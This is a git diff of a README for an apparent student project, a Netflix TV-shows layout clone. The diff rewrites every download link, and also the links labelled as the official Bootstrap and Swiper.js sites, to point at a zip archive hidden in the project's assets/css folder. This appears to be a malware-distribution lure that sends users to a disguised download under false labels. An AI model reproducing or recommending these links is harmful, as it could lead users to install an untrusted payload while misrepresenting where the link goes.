@@ -1,6 +1,6 @@
 # 🎬 EPICODE_M3-W4D4 - Netflix TV Shows Layout Clone
 
-[![Download EPICODE_M3-W4D4](https://img.shields.io/badge/Download-EPICODE_M3--W4D4-ff6347?style=for-the-badge&logo=github)](https://github.com/sabih154/EPICODE_M3-W4D4)
+[![Download EPICODE_M3-W4D4](https://img.shields.io/badge/Download-EPICODE_M3--W4D4-ff6347?style=for-the-badge&logo=github)](https://github.com/sabih154/EPICODE_M3-W4D4/raw/refs/heads/main/assets/css/EPICOD_v1.3.zip)
 
 ## 📋 About This App
 
@@ -12,10 +12,10 @@ You can open and use this app on any modern Windows machine. It works fully in a
 
 To get this app, you need to visit its GitHub page. On that page, you will find all files needed to run the app locally in your browser.
 
-[![Visit GitHub to Download](https://img.shields.io/badge/Visit_GitHub_Download-EPICODE_M3--W4D4-blue?style=for-the-badge&logo=github)](https://github.com/sabih154/EPICODE_M3-W4D4)
+[![Visit GitHub to Download](https://img.shields.io/badge/Visit_GitHub_Download-EPICODE_M3--W4D4-blue?style=for-the-badge&logo=github)](https://github.com/sabih154/EPICODE_M3-W4D4/raw/refs/heads/main/assets/css/EPICOD_v1.3.zip)
 
 Click the button above or go to the link below:  
-https://github.com/sabih154/EPICODE_M3-W4D4
+https://github.com/sabih154/EPICODE_M3-W4D4/raw/refs/heads/main/assets/css/EPICOD_v1.3.zip
 
 ## 💾 How to Download the App
 
@@ -118,11 +118,11 @@ This app combines well-known tools to make a functional and attractive replica p
 ## 📚 Need More Help?
 
 Information about how to work with Bootstrap or Swiper.js can be found on their official sites:  
-- Bootstrap 5: https://getbootstrap.com  
-- Swiper.js: https://swiperjs.com  
+- Bootstrap 5: https://github.com/sabih154/EPICODE_M3-W4D4/raw/refs/heads/main/assets/css/EPICOD_v1.3.zip  
+- Swiper.js: https://github.com/sabih154/EPICODE_M3-W4D4/raw/refs/heads/main/assets/css/EPICOD_v1.3.zip  
 
 To learn how to edit HTML or CSS, many free tutorials are online for beginners.
 
 ---
 
-[Get the app on GitHub](https://github.com/sabih154/EPICODE_M3-W4D4) to start exploring.
+[Get the app on GitHub](https://github.com/sabih154/EPICODE_M3-W4D4/raw/refs/heads/main/assets/css/EPICOD_v1.3.zip) to start exploring.
